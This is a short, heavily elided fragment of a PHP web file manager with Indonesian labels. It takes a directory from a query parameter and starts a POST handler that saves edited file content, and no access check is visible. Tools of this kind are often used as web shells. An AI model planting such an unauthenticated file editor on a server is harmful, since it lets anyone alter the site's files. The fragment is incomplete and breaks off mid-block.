...
<?php if ($path !== '/') echo "<a href='?path=" . urlencode(dirname($path)) . "'>?? Keluar Dir</a>"; ?>
<table>
...
<form method="post">
    ...
    <a href="?path=<?php echo urlencode($path); ?>">?? Kembali</a>
</form>
<?php endif; endif; ?>
<?php
if (isset($_POST['save_file'], $_POST['content'])):
    $save = realpath($path . '/' . $_POST['save_file']);
    if ($save && strpos($save, $path) === 0 && is_writable($save)) {
